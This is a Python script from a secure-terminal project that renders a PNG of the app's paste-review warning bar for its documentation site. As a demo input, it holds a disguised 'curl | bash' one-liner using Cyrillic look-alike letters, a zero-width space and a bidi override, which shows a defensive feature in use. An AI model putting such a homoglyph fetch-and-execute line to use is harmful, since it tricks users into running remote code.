#!/usr/bin/python3
## Copyright (C) 2026 - 2026 ENCRYPTED SUPPORT LLC <adrelanos@whonix.org>
## See the file COPYING for copying conditions.

## AI-Assisted

"""Render the in-window paste-review bar to a PNG, headless and deterministic.

The bar is the real one the app shows -- secure_terminal.review.ReviewBar --
fed a representative hostile paste (a curl | bash line whose domain and shell name
hide Cyrillic homoglyphs, plus a zero-width and a bidi override), with its Detail
panes expanded, so the summary, the four read-only preview panes (which reuse the
terminal's renderer) and the countdown-gated buttons appear exactly as a user
sees them. Used to generate the shot on the project's Pages site; run it again to
regenerate. No display is needed: it uses Qt's offscreen platform and grab().

It imports the app (secure_terminal.review), so run it against an installed
secure-terminal or point PYTHONPATH at a checkout:

    PYTHONPATH=<secure-terminal>/usr/lib/python3/dist-packages \
        usr/share/secure-terminal-tests/paste-warning-shot.py <output.png>

The payload is written with \\u escapes so this source stays plain ASCII; the
hidden characters live only in the rendered image.
"""

import os
import sys

# A headless grab needs no real display; force the offscreen platform before Qt
# initialises, unless the caller already chose one.
os.environ.setdefault('QT_QPA_PLATFORM', 'offscreen')

from PyQt6.QtWidgets import QApplication, QWidget, QVBoxLayout   # noqa: E402
from PyQt6.QtGui import QPalette, QColor                         # noqa: E402

from secure_terminal.review import ReviewBar               # noqa: E402

# A paste that looks like an ordinary install one-liner but hides look-alikes and
# invisibles: the 'a' in "example" and in "bash" are Cyrillic (U+0430), there is a
# zero-width space (U+200B), and a right-to-left override (U+202E) reorders the
# trailing comment. Escaped so this file stays ASCII-only.
PAYLOAD = ('curl -fsSL https://ex\u0430mple.com/get.sh | b\u0430sh\u200b'
           '  \u202e# trusted mirror\n')

# A non-zero countdown so the shot shows both send buttons disabled and counting
# down -- the anti-fat-finger gate, visible.
COUNTDOWN_SECONDS = 4


class _Term:
    """Minimal stand-in for the tab that held the paste: the bar reads its theme
    and font to style the preview panes (a real dark terminal, Hack font)."""
    _theme = 'dark'

    def current_font_family(self):
        return 'Hack'

    def dispatch_pending_paste(self, action):
        pass


def _dark_palette(app):
    """The terminal's dark look, so the shot is identical regardless of the desktop
    theme the capture happens to run under (reproducible output)."""
    app.setStyle('Fusion')
    pal = QPalette()
    pal.setColor(QPalette.ColorRole.Window, QColor('#1b1e24'))
    pal.setColor(QPalette.ColorRole.WindowText, QColor('#e6e6e6'))
    pal.setColor(QPalette.ColorRole.Base, QColor('#14161b'))
    pal.setColor(QPalette.ColorRole.Text, QColor('#e6e6e6'))
    pal.setColor(QPalette.ColorRole.Button, QColor('#2a2e37'))
    pal.setColor(QPalette.ColorRole.ButtonText, QColor('#e6e6e6'))
    app.setPalette(pal)


def main(argv):
    if len(argv) != 2:
        sys.stderr.write('usage: %s <output.png>\n' % argv[0])
        return 2
    out = argv[1]

    app = QApplication([argv[0], '-platform', os.environ['QT_QPA_PLATFORM']])
    _dark_palette(app)

    host = QWidget()
    layout = QVBoxLayout(host)
    layout.setContentsMargins(0, 0, 0, 0)
    bar = ReviewBar(host)
    layout.addWidget(bar)
    bar.show_review(_Term(), PAYLOAD, COUNTDOWN_SECONDS)
    bar._detail_btn.setChecked(True)        # expand the preview panes for the shot
    host.setFixedWidth(940)
    host.adjustSize()
    host.show()
    # let the layout settle and the previews render before grabbing
    app.processEvents()
    app.processEvents()

    pixmap = host.grab()
    if not pixmap.save(out, 'PNG'):
        sys.stderr.write('failed to write %s\n' % out)
        return 1
    sys.stderr.write('wrote %s (%dx%d)\n'
                     % (out, pixmap.width(), pixmap.height()))
    return 0


if __name__ == '__main__':
    sys.exit(main(sys.argv))
